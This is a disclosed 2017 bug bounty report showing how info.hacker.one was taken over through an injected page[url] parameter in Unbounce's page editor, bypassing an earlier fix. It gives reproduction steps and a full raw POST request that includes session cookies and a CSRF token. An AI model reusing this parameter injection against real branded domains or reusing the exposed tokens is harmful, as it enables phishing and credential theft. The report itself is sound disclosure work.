# Subdomain takeover #3 at info.hacker.one

## Report Details
- **Report ID**: 217358
- **URL**: https://hackerone.com/reports/217358
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-03-30T22:20:46.114Z
- **Disclosed**: 2017-06-21T04:10:57.987Z

## Reporter
- **Username**: ak1t4
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**

Hi team, looking the last fix released from unbounce team at https://hackerone.com/reports/209004 i've been able again to bypass it again and takeover the subdomain info.hacker.one with a new vulnerable __PARAM__ at UnbouncePages App

Actual Dns Entry:

{F172446}

### Steps To Reproduce & New PoC for HackerOne

1) I have claimed the domain and placed a new-page for PoC validation located under: 
Go to -> https://info.hacker.one/new-awesome-takeover/
2) You see the alert box and the New Subdomain Takeover

{F172447}
{F172448}


[ Unbounce Pages Team Section ]

### Reproduction Steps PoC at new PARAM-Endpoint

1) Login to account
2) Create a New Page under any domain
3) Go to "EDIT NAME"
4) Fill with any input 
5) Intercept Request with burp or another proxy
6) Add this body params:
```
&page%5Burl%5D=info%2ehacker%2eone%2Ftakeover-bypass-by-ak1t4
```
7) Refresh page - You see the New Claimed Domain at Url Page
{F172451}

[ POST REQUEST ]
```
POST /2235922/pages/eb50eb0c-48a8-483b-8747-285aacbeaed6 HTTP/1.1
Host: app.unbounce.com
Connection: close
Content-Length: 160
X-NewRelic-ID: XQQAUl9ADAQFV1hW
Origin: https://app.unbounce.com
X-CSRF-Token: 7fHXoRIVY2kDTQxt+k6jjNgJagryJHBfu7MuZLtB7V4=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: https://app.unbounce.com/2235922/pages/eb50eb0c-48a8-483b-8747-285aacbeaed6
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.8,fi;q=0.6,en;q=0.4
Cookie: optimizelyEndUserId=oeu1486009343856r0.6355656073169369; __qca=P0-1900902187-1486458680293; km_lv=x; _okdetect=%7B%22token%22%3A%2214865300449170%22%2C%22proto%22%3A%22https%3A%22%2C%22host%22%3A%22app.unbounce.com%22%7D; _ok=9006-109-10-5599; _hjIncludedInSample=1; __distillery=13f6068_9ea46c19-8132-4e4f-a2a7-33f852efb977-854183e7d-b084e0ec963d-a310; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vwo_uuid_v2=900CADBE3098CA856771F9DD381BEE83|2fbe46dc8984391b55ad33e11de009f6; __hstc=26860514.14d0f12fb1edb765ae477bb6b6c8267f.1488073812483.1490506325671.1490587373830.17; __hssrc=1; hubspotutk=14d0f12fb1edb765ae477bb6b6c8267f; ubvt=186.133.157.681486461608015598; _okac=bc8588c05fd6d7326c40a2ed71d3c572; _okla=1; _okbk=cd5%3Davailable%2Ccd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1490899590655%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _lp-webapp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTE4MzQ0MTI1MTEyZmVmZWY1OGFjMzRlOWE5MmUxZWEyBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMTdmSFhvUklWWTJrRFRReHQrazZqak5nSmFncnlKSEJmdTdNdVpMdEI3VjQ9BjsARkkiDHVzZXJfaWQGOwBGaQOOrh8%3D--7dc60f053571cb02d56d36e32bcfa074a50559d1; optimizelySegments=%7B%22181202216%22%3A%22false%22%2C%22181231084%22%3A%22referral%22%2C%22181236069%22%3A%22gc%22%7D; optimizelyBuckets=%7B%7D; _ga=GA1.2.698694919.1486458679; olfsk=olfsk4517478054873454; wcsid=PNXDqm36xvlrxT6B9x5TA0S0RE0PFAam; hblid=gQ8SNvQtERsXysoj9x5TA2AiCS3RE0OF; _okgid=bc6ff4d51dee8959d8e5980f77366c67; _ga=GA1.3.698694919.1486458679; kvcd=1490911449733; km_ai=████; km_ni=███████; km_vs=1; intercom-session-eqe7kbcu=KzB6MDkwZFQxdzBXUU1zRExacHl5c0VpZXpuSTVBaFpQbHBkd0FSOStJZ29mNldnYThhVFRVbFFFdXhtNEY3Ty0tVDRGTDVGZy9QakxqNTFSL3N2Q0RJUT09--a0cd83192ad36755d2bcaaaeefa0aa8026c4e5d7; _oklv=1490911811537%2CPNXDqm36xvlrxT6B9x5TA0S0RE0PFAam

utf8=%E2%9C%93&_method=put&authenticity_token=7fHXoRIVY2kDTQxt%2Bk6jjNgJagryJHBfu7MuZLtB7V4%3D&page%5Bname%5D=testing+new+param+vulnerable+at+unbouncepages.com+&page%5Burl%5D=info%2ehacker%2eone%2Ftakeover-bypass-by-ak1t4
```
 **Vulnerable Injected PARAM:** page%5Burl%5D=anydomain.com
**Endpoint:** /[account-id]/pages/[page-id]

**This Request update the page with the New Domain (any domain could be used and creating content into it)**

I create a New Private Video PoC here for the above explained -> https://youtu.be/1PWS76Am7y0

**(All branded domains under unbounce app are vulnerable)**

## Security Impact at H1:

*An attacker can utilize this domain info.hacker.one for targeting the organization by fake login hackerOne forms, or steal sensitive information of teams (credentials, credit card information, etc)

## Security impact at Unbounce Pages:

*An attacker can utilize this bug affecting all branded domains and customers at unbouncepages.com
and use all domains with evil purposes as stealing of sensitive information, credentials, credit card info, etc

Please let me know if more info needed or any help,

Best Regards,
@ak1t4

## Attachments
- Captura_de_pantalla_2017-03-30_a_las_18.47.00.png
- Captura_de_pantalla_2017-03-30_a_las_18.44.09.png
- Captura_de_pantalla_2017-03-30_a_las_18.44.18.png
- Captura_de_pantalla_2017-03-30_a_las_19.07.29.png
